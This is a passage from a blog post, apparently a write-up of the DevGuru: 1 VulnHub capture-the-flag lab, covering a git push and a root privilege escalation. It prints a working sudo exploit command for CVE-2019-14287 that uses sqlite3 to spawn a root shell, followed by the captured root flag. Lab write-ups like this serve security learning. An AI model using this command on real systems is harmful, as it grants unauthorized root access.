+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone http://devguru.local:8585/tiago/Teste.git
+$ cd Teste
+$ touch test.txt
+$ git add .
+$ git commit -am <span style="color:#e6db74">&#34;Primeiro commmit&#34;</span>
+$ git push origin master
+</code></pre></div><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055829/blog/image-20201215140141507_ktuy7u.png" alt="image-20201215140141507"></p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201215142829951_vrnpsc.png" alt="image-20201215142829951"></p>
+<h1 id="-privilege-escalation">🛡️ Privilege Escalation</h1>
+<p>One of the first thing to do during the enumeration is check the permissions I have executing something as root, like <code>sudo -l</code>.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055822/blog/image-20201215141736683_h2pwtn.png" alt="image-20201215141736683"></p>
+<p>I can run sqlite3 as root, but it will ask frank password for this, but we don&rsquo;t have this information. Verifying sudo version, I figured out that is vulnerable to privilege escalation, as says <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">CVE-2019-14287</a>.</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201215143527692_zgw677.png" alt="image-20201215143527692"></p>
+<p>From now on I used this to references:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></li>
+<li><a href="https://sqlite.org/cli.html">https://sqlite.org/cli.html</a></li>
+</ul>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201215145115575_buzrag.png" alt="image-20201215145115575"></p>
+<p>Time to become root.</p>
+<pre><code>sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
+</code></pre><p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055824/blog/image-20201215145740694_rlxbna.png" alt="image-20201215145740694"></p>
+<h1 id="-complete">🍻 Complete</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@devguru:/root# cat msg.txt
+cat msg.txt
+
+           Congrats on rooting DevGuru!
+  Contact me via Twitter @zayotic to give feedback!
+
+
+root@devguru:/root# cat root.txt
+cat root.txt
+96440606fb88aa7497cde5a8e68daf8f
+</code></pre></div>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/vulnhub/">vulnhub</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hacking/">hacking</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/ctf/">ctf</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/" data-tooltip="Funbox: 1 - Vulnhub ">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 Tiago Tavares. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/" data-tooltip="Funbox: 1 - Vulnhub ">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/12/devguru-1-vulnhub/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F12%2Fdevguru-1-vulnhub%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F12%2Fdevguru-1-vulnhub%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F12%2Fdevguru-1-vulnhub%2F">
+          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Tiago Tavares</h4>
+    
+      <div id="about-card-bio">Eternal student, cybersecurity pro, husband, runner.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Cybersecurity Consultant
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Brazil
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589318923/last_jedi1_ybpjeb.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://tiagotavares.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/tiagotavares.io\/2020\/12\/devguru-1-vulnhub\/';
+          
+            this.page.identifier = '\/2020\/12\/devguru-1-vulnhub\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'tiagotavares-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
